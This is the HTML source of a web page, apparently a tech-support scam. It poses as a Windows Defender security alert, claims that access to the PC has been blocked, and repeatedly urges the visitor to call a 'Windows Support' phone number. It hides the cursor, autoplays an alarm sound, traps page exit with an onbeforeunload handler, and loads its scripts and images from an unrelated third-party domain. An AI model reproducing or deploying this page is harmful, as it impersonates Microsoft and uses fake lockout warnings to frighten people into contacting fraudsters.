...
<html lang="en">
  <head>
    ...
    <title>Computer Error 02V7HGTVB</title>
    <link href="https://tastebudtreats.com/bol/msmm.png" rel="icon" id="favicon" type="image/png">
    <link href="https://tastebudtreats.com/bol/tapa.css" rel="stylesheet">
...
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-MR8CCKVQEX"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-MR8CCKVQEX');
</script>

    <script src="https://tastebudtreats.com/bol/noir.js"></script>
    <script>
  ...
  <body class="map" id="mycanvas" onbeforeunload="return myFunction()"  style="cursor:none">
    <audio autoplay="" id="pridez">
      <source src="https://tastebudtreats.com/bol/_Fm7-alert.mp3" type="audio/mpeg">
    </audio>
    <div class="bg" style="cursor:none">
      <div class="bgimg" style="top:0">
        <img src="https://tastebudtreats.com/bol/f24.png" alt="" width="100%">
      </div>
    </div>
    ...
    <div class="pro_box" style="cursor: none; display: block;">
      <div class="pro_box_header">
        <div class="row">
          <div class="col-md-12">
            <div class="minimize">
              <ul>
                <li>
                  <a href="#">
                    <img src="https://tastebudtreats.com/bol/mnc.png">
                  </a>
                </li>
              </ul>
            </div>
          ...
          <div class="col-md-4">
            <div class="logo">
              <img src="https://tastebudtreats.com/bol/msmm.png">
          ...
          <div class="col-md-8">
            <div class="activate_lic">
              <ul>
                ...
                <li>
                  <a href="#">
                    <img src="https://tastebudtreats.com/bol/set.png">
                  </a>
                </li>
                <li>
                  <a href="#">
          ...
          <div class="row">
            <div class="col-md-6">
              <div class="quick_scan">
                <p>
                  <img src="https://tastebudtreats.com/bol/vsc.png">
    ...
    <div class="pro_box2" style="cursor: none; display: block;">
      <img src="bx1.png" alt="" style="max-width: 100%;">
    </div>
          ...
          <div class="col-md-8">
            <div class="activate_lic">
              <ul>
                ...
                <li>
                  <a href="#">
                    <img src="https://tastebudtreats.com/bol/bel.png">
                  </a>
                </li>
                <li>
                  <a href="#">
        ...
        <div class="scan_body">
          ...
          <div class="table_quick2">
            <div class="row">
              <div class="col-md-4">
                <div class="pc_desk">
                  <img src="https://tastebudtreats.com/bol/pcm.png">
                </div>
              </div>
              <div class="col-md-4">
      ...
      <div class="row">
        <div class="col-md-12">
          <div class="right-foot" style="text-align:center">
            <span id="footertxt">
              <img src="https://tastebudtreats.com/bol/msmm.png"> Windows security </span>
            <span style="font-weight:500;padding-left:13px;color:#fff; ">Call Windows Support: <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> +1-856-492-1077
              </span>
            </span>
          </div>
        </div>
    ...
    <div class="lightbox" id="poptxt" style="display: block;">
      <div class="ilb top" style="font-size:17px">
        <div class="ilb headers" style="border-bottom:1px solid #d6d5d5">
          <span class="fl title" id="txtadd">
            <span class="fl ilb">
              <img src="https://tastebudtreats.com/bol/dm.png" class="logo3">
            </span>Windows Defender Security Center </span>
          <span class="fl title2" id="txts1">
            <a href="#" id="cross">
              <img src="https://tastebudtreats.com/bol/cs.png">
            </a>
          </span>
        </div>
      </div>
      ...
      <img src="https://tastebudtreats.com/bol/re.gif" id="banner">
      <div id="disclaimer">Access to this PC has been blocked for security reasons.  <br>
        <span class="support" style="font-size:22px;">Call Windows Support:&nbsp; <span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> +1-856-492-1077
          </span>
        </span>
      </div>
      <div id="bottom">
        <img src="https://tastebudtreats.com/bol/msmm.png" id="badge">
    ...
    <div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new">
      ...
      <p style="padding-bottom:0;color:#fff;font-size:16px">Call Windows Support: <strong>
          <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">+1-856-492-1077
          </span>
        </strong>
      </p>
    ...
    <div class="answer_list" style="display:none;background-color:rgb(226 227 229 / 90%);height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
      <p style="color:#383d41;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">You should contact us immediately so that our engineers can guide you through the removal process by phone. <br>Your computer is disabled.<br>
        <strong>Call Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> +1-856-492-1077
          </span>
        </strong>
      </p>
    </div>
    <div id="chat" style="display: block;">
      ...
      <h4 style="font-weight:600;font-size:22px"> +1-856-492-1077
    ...
    <script src="https://tastebudtreats.com/bol/nvidia.js"></script>
    <script src="https://tastebudtreats.com/bol/jupiter.js"></script>
    <script>
      $(function() {
        var a = 0,
